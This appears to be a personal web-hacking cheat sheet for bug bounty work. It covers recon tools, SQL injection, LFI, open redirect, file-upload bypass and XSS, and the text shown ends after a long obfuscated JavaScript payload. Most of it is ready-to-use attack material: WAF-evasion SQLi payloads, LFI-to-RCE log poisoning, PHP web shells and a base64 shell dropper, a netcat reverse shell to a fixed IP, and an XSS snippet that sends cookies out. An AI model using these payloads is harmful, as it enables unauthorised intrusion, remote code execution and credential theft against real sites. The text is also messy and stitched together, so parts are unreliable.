## Summary

- [recon step 1 ](#recon)
- [waf](#waf)
- [automatic scan](#automatic).
- [sql scan  ](#SqlScan )
- [lfi](#lfi).
- [open redirect](#openRedict)
- [shell upload](#shellupload)
- [xss](#xss)



  ### recon
>tool subfinder automatic 
```
subfinder -d example.com >res.txt
```
> using gobuster for wordlists
```
gobuster dns -d example.com -w wordlits.txt
```
>next
> passive scan httpx

```
httpx -l res.txt -o res2.txt
cat res.txt |httpx-toolkit
```

> next step install tool 
* [subzy](https://github.com/PentestPad/subzy)
> next

```
subzy run --targets res2.txt > res3.txt

```

>scan parampeter
> old parameter ,1-gau 2-paramspider
* [gau](https://github.com/lc/gau)
```
cat res3.txt |gau |tee res4.txt
```
>next 
```
paramspider -l domains.txt
paramspider -d exam.com
```
> new parampeter
```
ffuf -u exam.com/FUZZ.php -w wordlist.txt

dirsearch -u exam.com 
```
> Bruteforce parameters
* [Sh1Yo/x8](https://github.com/Sh1Yo/x8) 

* Use wordlists of common parameters and send them, look for unexpected behavior from the backend. 
    ```ps1
    x8 -u "https://example.com/" -w <wordlist>
    

    x8 -u "https://example.com/" -X POST -w <wordlist>
    ```

> arjun
```  
arjun -d example.com
```
### the end 





### automatic
>tool all scan
```
nuclei -u example.com
```
>next
```
nmap -A -O example.com
```
> next
```
whatweb example.com
``` 
>next
```
searchsploit example
```
# Nikto
```
nikto -h example.com
```
> tool df list

# the end 


### SqlScan

>google dorking
>tool scan sqlmap and ghuari
>
>
[ghuari](https://github.com/r0oth3x49/ghauri)
```
site:exam.com id=
site:exam.com php?q=

```
> gf --list
```
cat url.txt|gf sqli | tee sql.txt
```
> web scan

*.[web](https://pentest-tools.com/website-vulnerability-scanning/sql-injection-scanner-online)
>
> 
> error reuslt
```
1234'%2F%2A%2A%2FAnd%2F%2A%2A%2F%0Asleep(5)
1234'%2F%2A%2A%2FAnd%2F%2A%2A%2F%0Asleep(5%29
' OR SLEEP(25)--
'
~`
///'
//'
////'
"
`
')
")
`)
'))
"))
`))
```
>balance url
```
--+-
--+
)--+-
))--+-
--
--+
)--
))--
-- -/*
/*
%23
%2323
;%00
%00
;%60
;%60
;%00
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```
>more example
```
false
Confirming Blind Boolean-based SQLI:

False Query:
https://redacted.com/projects/projects-edit.html?id=879 AND 1=2 - -

True Query:
https://redacted.com/projects/projects-edit.html?id=879 AND 1=1 - -
....
FALSE Query:

Copy
https://redacted.com/projects/projects-edit.html?id=879 AND(length(database(0,1)))=1 -- -
TRUE Query:
https://redacted.com/projects/projects-edit.html?id=879 AND(length(database(0,1)))=12 -- -
....
FALSE QUERY:
https://redacted.com/projects/projects-edit.html?id=879 AND(ascii(substr((select database()),1,1)))=97   -- -

TRUE QUERY:
https://redacted.com/projects/projects-edit.html?id=879 AND(ascii(substr((select database()),1,1)))=121   -- -
```

>next order by
```
ORDER BY 9
GROUP BY 9
order by 9
ORDER BY 1,2,3,4,5,6,7,8,9
/*!50000ORDER*/ 9
+ORDER BY/**_**/9
+/*!order/**/by*/1
+AND+MOD(52,12)+/*!50000GROUP*/+BY+100
+/*!50000GROUP*/+/*!50000BY*/+100
23%0AORDER%23%0ABY%23%0A100
+AND+MOD(29,9)+/*!50000ORDER/**_**/*/+/*!50000BY/**_**/*/+100
/*!50000BY/**_**/*/
+/*!12345ORDER*/+/*!12345BY*/100
+ORDER+BY+100+ASC
%2f**%2fORDER%2f**%2fBY%2f**%2f100
```
>next union
```
+un/**/ion+se/**/lect
union selcet
AND 0 ?NION SELECT
AND 0 %55NION %53ELET
AND 0 UNION SELECT null,null,null
AND+0+/*!50000%55NI\ON*/+/*!
50000%53ELE\CT/**_**/*/
%75nion %73elect
%23%0A/*!50000union/**_**/*/
%23%0AdistinctROW/**_**/
%23%0ASelect%23%0A
AND 0 UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9))
+un/**/ion+se/**/lect
+UNION+ALL+SELECT
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/
/*!50000UNION/**_**/*/
+And .0UnIOn-- -%0ASeLe%43t
/*!%2f**%2funion%2f**%2fselect%2f**%2f
/*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)
+AND+0+UNION/**/DISTINCTROW+SELECT
+AND+MOD(52,12)+/*!50000UNION/**_**/*/+/*!50000SELECT/**_**/*/
/**8**/and/**8**/0/**8**/UniOn/**8**/sEleCT/**8**/
+And/**/.0union/*%26*/distinctROW+select
+REVERSE(noinu)+REVERSE(tceles)
 /*!%55NiOn*/ /*!%53eLEct*/   %55nion(%53elect 1,2,3)-- -   +union+distinct+select+   +union+distinctROW+select+   /**//*!12345UNION SELECT*//**/   concat(0x223e,@@version)   concat(0x273e27,version(),0x3c212d2d)   concat(0x223e3c62723e,version(),0x3c696d67207372633d22)   concat(0x223e,@@version,0x3c696d67207372633d22)   concat(0x223e,0x3c62723e3c62723e3c62723e,@@version,0x3c696d67207372633d22,0x3c62723e)   concat(0x223e3c62723e,@@version,0x3a,”BlackRose”,0x3c696d67207372633d22)   concat(‘’,@@version,’’)   /**//*!50000UNION SELECT*//**/   /**/UNION/**//*!50000SELECT*//**/   /*!50000UniON SeLeCt*/   union /*!50000%53elect*/   +#uNiOn+#sEleCt   +#1q%0AuNiOn all#qa%0A#%0AsEleCt   /*!%55NiOn*/ /*!%53eLEct*/   /*!u%6eion*/ /*!se%6cect*/   +un/**/ion+se/**/lect   uni%0bon+se%0blect   %2f**%2funion%2f**%2fselect   union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A   REVERSE(noinu)+REVERSE(tceles)   /*--*/union/*--*/select/*--*/   union (/*!/**/ SeleCT */ 1,2,3)   /*!union*/+/*!select*/   union+/*!select*/   /**/union/**/select/**/   /**/uNIon/**/sEleCt/**/   /**//*!union*//**//*!select*//**/   /*!uNIOn*/ /*!SelECt*/   +union+distinct+select+   +union+distinctROW+select+   +UnIOn%0d%0aSeleCt%0d%0a   UNION/*&test=1*/SELECT/*&pwn=2*/   un?+un/**/ion+se/**/lect+   +UNunionION+SEselectLECT+   +uni%0bon+se%0blect+   %252f%252a*/union%252f%252a /select%252f%252a*/   /%2A%2A/union/%2A%2A/select/%2A%2A/   %2f**%2funion%2f**%2fselect%2f**%2f   union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A   /*!UnIoN*/SeLecT+
+and+(select 1)=(Select 0xAA[..(add about 1000 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2
 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4
-15+uni*on+sel*ect+1,2,3,4
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
+#uNiOn+#sEleCt
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/*--*/union/*--*/select/*--*/
union (/*!/**/ SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
+%2F**/+Union/*!select*/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
uNiOn aLl sElEcT
UNIunionON+SELselectECT
/**/union/*!50000select*//**/
0%a0union%a0select%09
%0Aunion%0Aselect%0A
%55nion/**/%53elect
uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
%0A%09UNION%0CSELECT%10NULL%
/*!union*//*--*//*!all*//*--*//*!select*/
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
```
>next
>sql to lfi
```
load_file('../etc/passwd')
load_file(0x2e2e2f6574632f706173737764)
hex(load_file('/etc/passwd'))
```
>sql to rce
```
=1’ /*!50000union*/ select 1,2,3,4,5,’../index’,7,8,’php://filter/convert.base64-encode/resource=.’ -- -
1' /*!50000union*/ select 1,2,3,4,5,6,7,8,’data://text/plain,<?php echo system(“uname -a”);?>’-- -
```
>print system
```
@@ft_boolean_syntax
version()
current_database()
system_user()
user()
database()
now()
@@hostnasession_user()me
@@port
@@tmpdir
@@slave_load_tmpdir
@@datadir
@@basedir
@@log
@@log_bin
@@log_error
@@GLOBAL.have_symlink
```
>for burp collabtour
```
;declare @q varchar(99);set @q=’\\[YOU_BURP_COLLAB_SUBDOMAIN_PART_HERE].burpcollab’+’orator.net\ogy’; exec master.dbo.xp_dirtree @q; —

```
>next cooking example
```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36';WAITFOR DELAY ‘00:00:05’;--
```

>tool automatic

```
sqlmap -u exam.com/?q=1
sqlmap -u exam.com/?q=1 --crawel 2 --batch
```
>sqlmap advance
```
sqlmap -r file.txt --risk=3 --level=5 --batch 
```
> more sqlmap

[advancesqlmap](https://muhdaffa.medium.com/tips-and-tricks-for-effective-sql-injection-testing-using-sqlmap-tamper-scripts-ed4bfa5717e7?source=rss------bug_bounty-5)

[hacksql](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)

*[sqlmapmore](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://medium.com/@cuncis/the-ultimate-sqlmap-tutorial-master-sql-injection-and-vulnerability-assessment-4babdc978e7d&ved=2ahUKEwjMq_DLtu-EAxWoSfEDHdHMCxEQjjh6BAgjEAE&usg=AOvVaw0tXqR_b0UWLkd3QVLl6ddw)

#the end

### lfi
> best parameters scan url
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
>next
```
cat url.txt|gf lfi |tee a.txt
```
>payalod
```
/et/passwd
```
>block/etc/passwd/
```
../var/www/*
```
>tool for scan

```
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
>advance bypass
```
url=exam.com/?u=dog
to 
php://filter/convert.base64-encode/resource=dog/../../../etc/passwd
```
>[lfi scan ](https://github.com/halohashm79/lfi-scan)
>python lfi.py

>next
>tool for php filter and full
[lfi scan all](https://github.com/Chocapikk/LFIHunt)


>payalod lfi
```
file:///etc/passwd
```
># lfi to rce
> /proc/self/environ
```
filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
..
<?php system('cat /etc/passwd');?>
```
>next
```
/proc/self/fd/number (rannge 1,100)
and
User-Agent: <?=phpinfo(); ?>
```
>next log
```
/etc/php/x.x/cli/php.ini
/var/log/tittpd/access log
/var/log/apache/error.log /var/log/apache2/error.log
/var/log/httpd/error log
/var/log/messages
/var/log/cron.log
/var/log/secure
/var/log/auth.log
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/sites-enabled/domain.conf
/etc/apache2/sites-enabled/example.com.coof /etc/apache2/sites-enabled/sub.example.com.conf
/etc/apache2/sites-enabled/sub.conf
/etc/apache2/sites-available/domain.conf
/etc/apache2/sites-available/example.com.conf
/etc/apache2/sites-available/sub.example.com.conf
/etc/apache2/sites-available/sub.conf
/etc/apache2/.htpasswd
/etc/httpd/conf/httpd.conf%00
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log

```
>next
```
WordPress: /var/www/html/wp-config.php

Heading 1

م

BAA

Joomla: /var/www/configuration.php

Dolphin CMS: /var/www/html/inc/header.inc.php

Drupal:/var/www/html/sites/default/settings.php

Mambo: /yar/www/configuration.php

PHPNuke: /var/www/config.php

PHPbb:/var/www/config.php

WINDOWS

C:/Windows/System32/drivers/etc/hosts I

C:/Windows/Panther/Unattend/Unattended.xml

C:/Windows/Panther/Unattended.xml

C:/Windows/Panther/Unattend.txt

C:/Unattend.xml

C:/Autounattend.xml

C:/Windows/system32/sysprep

C:/Inetpub/wwwroot/

C:/Inetpub/wwwroot/web.config
I Ngnix

/var/log/nginx/access.log

/var/log/nginx/error.log

/etc/nginx/nginx.conf /etc/nginx/conf.d/.htpasswd

/etc/nginx/conf.d/example.com.conf

/etc/nginx/conf.d/example.conf

/etc/nginx/conf.d/subdomain.example.com.conf

/etc/nginx/conf.d/subdomain.conf

/etc/nginx/sites-available/example.com.conf

/etc/nginx/sites-enabled/default

/etc/nginx/sites-enabled/example.com.conf

/usr/local/nginx/conf/nginx.conf /usr/local/etc/nginx/nginx.conf

#PHP web cont (x.x is specified PHP
```

>next way
```

=php://input  to data
<?=phpinfo(); ?>

```

>Set the cookie to <?php system('cat /etc/passwd');?>
```

login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
>next php filter
>
[php chain](https://github.com/synacktiv/php_filter_chain_generator)
```
 python php py --chain <?php
    system('pwd');
?>
```

>and use benefits for cat index html
>
```
php://filter/convert.base64-encode/resource=index.php
```
>next upload jpg to shell
```
payalod.jpg><?php $dir='.'; $file = scandir($dir); print_r($file); ?>
to page=zip://tmp/upload/1SZbCGZYs.jpg%23r&c=pwd
```
#the end



### openRedict
>How To Bypass
Use `@`
```
https://testvuln.com/login?next=https://vuln.me@evit.com
```
# xsstoopenredic
```
<a href=http://evil.com>sumit/ your report here </a>
```
>parampter

```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io/
data=https://c1h2e1.github.io/
qurl=https://c1h2e1.github.io/
login=https://c1h2e1.github.io/
logout=https://c1h2e1.github.io/
ext=https://c1h2e1.github.io/
clickurl=https://c1h2e1.github.io/
goto=https://c1h2e1.github.io/
rit_url=https://c1h2e1.github.io/
forward_url=https://c1h2e1.github.io/
@https://c1h2e1.github.io/
forward=https://c1h2e1.github.io/
pic=https://c1h2e1.github.io/
callback_url=https://c1h2e1.github.io/
jump=https://c1h2e1.github.io/
jump_url=https://c1h2e1.github.io/
click?u=https://c1h2e1.github.io/
originUrl=https://c1h2e1.github.io/
origin=https://c1h2e1.github.io/
Url=https://c1h2e1.github.io/
desturl=https://c1h2e1.github.io/
u=https://c1h2e1.github.io/
page=https://c1h2e1.github.io/
u1=https://c1h2e1.github.io/
action=https://c1h2e1.github.io/
action_url=https://c1h2e1.github.io/
Redirect=https://c1h2e1.github.io/
sp_url=https://c1h2e1.github.io/
service=https://c1h2e1.github.io/
recurl=https://c1h2e1.github.io/
j?url=https://c1h2e1.github.io/
url=//https://c1h2e1.github.io/
uri=https://c1h2e1.github.io/
u=https://c1h2e1.github.io/
allinurl:https://c1h2e1.github.io/
q=https://c1h2e1.github.io/
link=https://c1h2e1.github.io/
src=https://c1h2e1.github.io/
tc?src=https://c1h2e1.github.io/
linkAddress=https://c1h2e1.github.io/
location=https://c1h2e1.github.io/
burl=https://c1h2e1.github.io/
request=https://c1h2e1.github.io/
backurl=https://c1h2e1.github.io/
RedirectUrl=https://c1h2e1.github.io/
Redirect=https://c1h2e1.github.io/
ReturnUrl=https://c1h2e1.github.io/
```
#Open Redirect to XSS
```
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=
alert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```

>shell  url =
```
url=https://github.com/mIcHyAmRaNe/wso-webshell/blob/master/wso.php
```
>shortlink to shell
```
payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
```
>next
# Full Account Takeover via Open Redirection link below
-[youtube ](https://youtu.be/8q5FAFAhFKE?si=xlwGno_SlaYrC3P5)

# the end
### waf
>website
>
[url encode](https://amp.urlencoder.org/)

>[base64 encode](https://www.base64decode.org/)
>
>[sheif ](https://cyberchef.io/)
>
>[github waf](https://github.com/0xInfection/Awesome-WAF)





# shellupload
[automatic shell upload](https://github.com/sAjibuu/Upload_Bypass)
>and more upload information
[link](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/)

>bypass Bypass Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain link
[Content-Type wordlist:](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)

>shell bash
```
nc -e /bin/sh 192.168.1.7 443
nc -nlvp 443
```
>great  
>پاشگر
```
exploit.php
exploit.php3
exploit.php4
exploit.php5
exploit.phtml
exploit.phar

exploit.jpg.php
exploit.jpeg.php
exploit.png.php
exploit.gif.php
exploit.pdf.php

exploit.php.
exploit.php.jpg
exploit.php.jpeg
exploit.php.png
exploit%2Ephp
exploit.p.phphp
exploit.php%00.jpg
exploit.php%0d%0a.jpg

exploit.PHP
exploit.pHp

exploit.php/
exploit.php//
exploit.php\
exploit.php#
exploit..php
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.png.php
file.png.Php5
file.png.php
file.png.pHp5
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
flile.phpJunk123png
file.png.jpg.php
file.php%00.png%00.jpg
>link to web shell
```
>sql to file
```
sleep(10)-- -.jpg
```
>create shel pho
```
<?php system($_GET['cmd']);?
<?php system('pwd'); ?>
```
# Open Redirect uploading svg files
```
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"/
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```
#  shell to SSTI 
```
{{2*3}}.jpg
{2*3}.jpg
2*3.jpg
2*3}}.jpg
2*3}.jpg
${2*3}.jpg
"{{2*3}}.jpg
```
# php to jpg
```
<?php echo system('id');?>.jpg
"><?php echo system('id');?>.jpg
```
>xss to shell
```
<script>alert(1)</script>.jpg
"><script>alert(1)</script>.jpg
```

# rce
```
test.jpg;sleep 10
test.jpg;sleep+10
test.jpg;sleep 10#
test.jpg;sleep 10%00
test.jpg|sleep 10
test.jpg%0Asleep 10
;sleep 10 test.jpg
```

# Reverse Shell

>metadata:
```
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```
>photo make size
```
convert -size 32x32 xc:white test.jpg

```
>more example
```
------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg <!-- Change this. Try other types such as image/gif, plain/text, etc. -->

<?php echo system($_GET['cmd']); ?>

------abcdefghijk
```
>more
```
------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php" <!-- Change this. -->
Content-Type: application/x-php

<?php echo system($_GET['cmd']); ?>

------abcdefghijk
```

>and hex to png bypass
>add
```
89 50 4E 47 0D 0A 1A 0A
```
```
GIF89a; <?php system($_GET['cmd']); ?>
```
--
>shell and lfi to rce
```
<?php $a = base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4='); $file = fopen('a.php','w'); echo fwrite($file,$a); fclose($file); ?>
```
-
# shell wget 
-
-[shell](https://github.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor)
# the end 

### xss
-tool 
[xsstrike to find common source ](https://github.com/s0md3v/XSStrike) 
>-
>[dalfox](https://github.com/hahwul/dalfox)

--advance bypass 
-link

[cheat xss](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
>-
-> advance for api login 
```
<style onload=alert(1)></style>
```
-
```
<style onload="fetch("/finder", {

method: "POST",

body: "username=cryptocat",

headers: { "Content-Type": "application/x-www-form-urlencoded" },

});"></style>
```
>-
```
<script>
  fetch('http://localhost/XSS/grabber.php?c=' + document.cookie)
    .then(response => console.log('Cookie sent:', document.cookie))
    .catch(error => console.error('Error sending cookie:', error));
</script>
```
>-commom source view
```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```


> payalod xss
```
<a id=ok href=tel:alert(1337)>
<svg onload=alert(1337)>
"-alert(1337)-"
javascript:alert(1337)

```
-commom bypass 
>replace(/[A-Za-z0-9]/"
```
 valid non-alphanumeric esoteric javascript.
/* URL Encoded */
"%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D%5B(%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(%5B%5D%5B%5B%5D%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(%5B%5D%5B%5B%5D%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D((!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%5B%2B!%2B%5B%5D%5D%2B%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B!%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D)()"
                            
/* No Encoding */
